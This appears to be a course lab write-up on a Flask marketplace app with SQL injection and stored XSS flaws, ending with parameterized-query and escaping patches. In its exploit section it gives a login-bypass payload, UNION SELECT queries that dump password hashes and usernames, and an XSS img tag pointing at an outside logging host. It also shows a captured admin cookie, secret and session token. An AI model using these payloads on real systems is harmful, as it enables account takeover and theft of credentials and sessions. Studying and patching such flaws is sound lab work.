########### Vulnerabilities:########################################
There are two identified vulnerabilities in this program. SQL Injection vulnerability and XSS Attack vulnerability.   

1- SQL Injection

The vulnerability basically gives the attacker ability to inject malicious SQL commands such as reading protected password hashes, or unauthorized log in. There are other commands that can be done taking advantage of this exfiltration entrance.  


To be precise, The vulnerability existed here:
```
def auth_user(u, p):
    db = getattr(g, '_user_db', None)
    if not db:
        db = g._user_db = sqlite3.connect(user_db_path)

    cur = db.cursor()
    q = "SELECT name, surname, username, passwd, is_admin FROM users WHERE username='{0}';".format(u)
    cur.execute(q)
```

.format(u)  is a bad way of passing arguments to the SQL query. and the query will not be DB Safe because of the DB API will not be able to see what has been passed, but rather it will receive the query q as trusted source. 

---------------------------------------------------------------------------------------------------------
2- XSS Vulnerability 

The vulnerability gives the attacker a way of injecting HTML/javascript codes that can be triggered by whomever visits the application. In other words, attackers are able to insert XSS codes such as   <img src="javascript:alert('HEY I gotcha, XSS')"/>  and this is very basic, but as soon as the application are vulnerable to accepting this as valid inputs and represent them in the page exactly as they are, as the HTML markup will be presented as part of the page. And whenever these codes, gets parsed by the browser as HTML, the browser will trigger whatever the attacker intended to do.  


The vulnerability existed within the function that handles posting title, description,  buying/selling.  The inputs are not HTML sanitized before going into the database, therefore, whenever an arbitrary puts HTML there, it will be presented as part of the whole page which is considered a cross-site scripting attack.
```
@app.route('/submit', methods=['POST'])
def submit():
    if 'username' not in session:
        return redirect(url_for('index'))

    u = get_user(session['username'])
    if not u:
        return redirect(url_for('index'))

    title = request.form['title']
    desc = request.form['description']
    .....

////
def submit_post(u, t, d, a):
    db = getattr(g, '_market_db', None)
    if not db:
        db = g._market_db = sqlite3.connect(market_db_path)

    table = 'buying'
    author_col = 'buyer'
    if a == 'sell':
        table = 'selling'
        author_col = 'seller'

    cur = db.cursor()
    q = "INSERT INTO {0}({1}, title, description) VALUES(?, ?, ?);".format(table, author_col)
    .......
```

######################## Exploits: ########################################

1- SQL injection 


To exploit the SQL injection vulnerability, is by passing the lunched attack on the login page, on the username text input. 

The sql injection first is tested by putting a single quote  (')  , then the application will show an error which indicated the input is not sanitized properly. 

- Log in attack: without even seeing the original query we can assume this username is happened to be in a WHERE clause so if we close that value with a single quote then add OR 1=1 and comment the rest  - - 
so the actual attack is:

```
xxx'  or 1=1; - -  
```

Then we will log in.

- printing hashes, 
after seeing the original source code, we know the column names, so we could do a UNION select command to perform another select of what we want, but need to make sure we select with same number of columns and at the same time, we noticed it prints the username in case of a failed log in. So, we have to put the value that we need to show on the same index of the username in the original select command. 

We can actually do that blindly by this

```
ss' UNION SELECT 1,1,2,1,1 --;
```
and we can see it prints 2! 

So we need to put whatever we want to see in the place of 2

```
ss' UNION SELECT 1,1,passwd,1,1 from users --;
```
Then we get


    Invalid credentials, .GmvBi2oRGXto, try again

Now we get the user by a smile for clause

```
ss' UNION SELECT 1,1,username,1,1 from users where passwd=".GmvBi2oRGXto"--;
```

burnham.huxtable


So we know have credentials to login.

To get all of the hashes, I found a useful command which is an aggregated function called: 

```
xx' union select 1,1,group_concat("passwd",","),1,1 from users--  TO get the hashes
xx' union select 1,1,group_concat("usernames",","),1,1 from users-- To get the usernames
```
and resulting hashes/usernames will be in a corrosponding order.

The cracking program for brute forcing the hashes is designed by first looking at the regular expression used for making the passwords:
```
 \?[A-Z]{2}[a-z]{2}[0-9]{2}!
```
So I figure out that a password should be like  this  "? | Two capital letters | Two small letters | two digits | !"   e.g. "?AAaa99!" 



---------------------------------------------------------------------------------------------------

2- The XSS Attack

First we have to log in,  then we post this malicious code 
```
<img src="http://amplifier.ccs.neu.edu:30029/">
```
  This will actually trigger the browser of whomever visits the page to open our Deanonymize application. 
And then we will see the http requests going to our set up Deanonymize application and from there will get the http requests, and we can print out http cookie and remote addr from the http headers. 
The Deanonymize application is set with full logging and display the whole http requests, as soon as someone hits that url for more ease of use. I could also print that into a file. 


   
After the admins got visit the vulnerable app,   I got this into my user app

```
('REQUEST',
####Omitted 
  'HTTP_COOKIE': 'secret=ydZ7RvFc-2VeGnnWTMteVPzb6wsF_wAOXPRF5PPo5Ak=; session=eyJ1c2VybmFtZSI6ImFkbWluIn0.B9CX8Q.qaBiAufCG6XK-VYpaSuVHeUxXzc',
  'HTTP_HOST': 'amplifier.ccs.neu.edu:30029',
  'HTTP_REFERER': 'http://amplifier.ccs.neu.edu:11991/',
  'HTTP_USER_AGENT': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0',
  'PATH_INFO': '/',
  'QUERY_STRING': '',
  'REMOTE_ADDR': '129.10.115.163',   # GOT THE IP HERE
  'REMOTE_PORT': 47307,
  'REQUEST_METHOD': 'GET',
  'SCRIPT_NAME': '',
  'SERVER_NAME': '0.0.0.0',
  'SERVER_PORT': '5000',

###Omitted 
```

So I got the secret value  + IP


####################### PATCH: ##############################################

1- SQL Injection

q = "SELECT name, surname, username, passwd, is_admin FROM users WHERE username = ? ;"
    cur.execute(q, (u,))

Instead of using format,  we use passing arguments to the execute command of the DB API function, this way we ensure it gets handled by the DB API and it will make the necessarily escaping.


-------------------------------------------------------------------------------------------


2- XSS Attack

instead of just inserting whatever user inputs of title+description into the db table, we use the escape method which is integrated into the template engine within Flask.


```
from jinja2 import utils
 # XSS Protection:  HTMML-Sanitize values of title, description:
    t = utils.escape(t)
    d = utils.escape(d)
```

This ensure that any HTML inputs will be sanitized and would not be stored as an actual HTML code that can be parsed by the browser when displayed later. Rather, it will escape it markup so for example ```"<"``` (I actually found a bug here where github does deal with this as html, and the rest of the data got ignored without putting this as a code with ` ` `) will be stored as the hex representation that shows this symbol which is "&lt;" and so on for the rest.


